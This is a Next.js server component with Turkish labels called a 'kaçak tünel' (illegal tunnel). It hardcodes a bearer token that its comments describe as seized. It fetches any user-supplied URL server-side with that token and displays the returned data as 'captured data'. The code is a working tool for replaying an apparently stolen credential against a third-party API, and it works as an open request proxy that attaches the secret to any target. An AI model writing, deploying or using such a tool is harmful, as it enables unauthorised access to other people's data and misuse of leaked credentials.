import React from 'react';

// 🚨 VERCEL SUNUCUSU ÜZERİNDEN ÇALIŞAN KAÇAK TÜNEL 🚨
export default async function KacakTunel({ searchParams }: { searchParams: { hedef?: string } }) {
  const hedef = searchParams?.hedef || '';
  
  // KOMUTANIN ELE GEÇİRDİĞİ MAYMUNCUK ANAHTARI
  const TOKEN = "Bearer eyJhbGciOiJFUzI1NiIsImtpZCI6IjNhMDMyY2I2LTMzZWMtNDgyYS1hN2E4LTQ4OTI1ZjA3MWNkNCIsInR5cCI6IkpXVCJ9..aEBzigW1699JVklvw1lFWE4ofdFe2t8rN6A14_CoanuN6rbS_j8MWe5x4BrF5uZ9gn2iXscICGWOKjazCg94Ag";

  let sonuc = null;
  let hata = null;

  if (hedef) {
    try {
      const res = await fetch(hedef, {
        headers: {
          'Authorization': TOKEN,
          'Content-Type': 'application/json'
        },
        cache: 'no-store' // Veriyi taze çekmesi için
      });
      
      if (!res.ok) {
        hata = `Kalkanlara Çarptık! HTTP Hatası: ${res.status}`;
      } else {
        sonuc = await res.json();
      }
    } catch (e: any) {
      hata = `Tünel Çöktü: ${e.message}`;
    }
  }

  return (
    <div className="min-h-screen bg-slate-950 text-emerald-400 p-4 sm:p-8 font-sans">
       <div className="max-w-4xl mx-auto">
           <h1 className="text-3xl font-black mb-2 text-rose-500 tracking-widest drop-shadow-[0_0_15px_rgba(225,29,72,0.5)]">🚨 KAÇAK TÜNEL MERKEZİ 🚨</h1>
           <p className="text-slate-400 mb-8 text-sm">Vercel sunucusu üzerinden Skorun Kalbi'ne yapılan Sızma Testi Arayüzü.</p>
           
           <form method="GET" className="flex flex-col sm:flex-row gap-4 mb-8">
              <input 
                type="text" 
                name="hedef" 
                defaultValue={hedef} 
                placeholder="DevTools'tan kopyaladığın Request URL'yi buraya yapıştır..." 
                className="flex-1 bg-slate-900 border border-emerald-500/50 p-4 rounded-xl text-white outline-none focus:border-emerald-400 shadow-inner" 
                required
              />
              <button type="submit" className="bg-emerald-600 hover:bg-emerald-500 text-white px-8 py-4 rounded-xl font-black tracking-widest transition-colors shadow-[0_0_20px_rgba(16,185,129,0.3)]">
                TÜNELİ AÇ
              </button>
           </form>

           {hata && <div className="bg-red-950/80 border border-red-500 text-red-300 p-6 rounded-xl font-bold tracking-wide">{hata}</div>}
           
           {sonuc && (
             <div className="bg-slate-900/80 p-6 rounded-xl border border-emerald-500/50 shadow-[0_0_30px_rgba(16,185,129,0.1)]">
               <h2 className="text-emerald-400 font-bold mb-4 tracking-widest border-b border-emerald-500/30 pb-2">🎯 SIZMA BAŞARILI! ELE GEÇİRİLEN VERİ:</h2>
               <div className="overflow-auto max-h-[600px] custom-scrollbar">
                 <pre className="text-xs text-emerald-300/80">{JSON.stringify(sonuc, null, 2)}</pre>
               </div>
             </div>
           )}
       </div>
    </div>
  );
}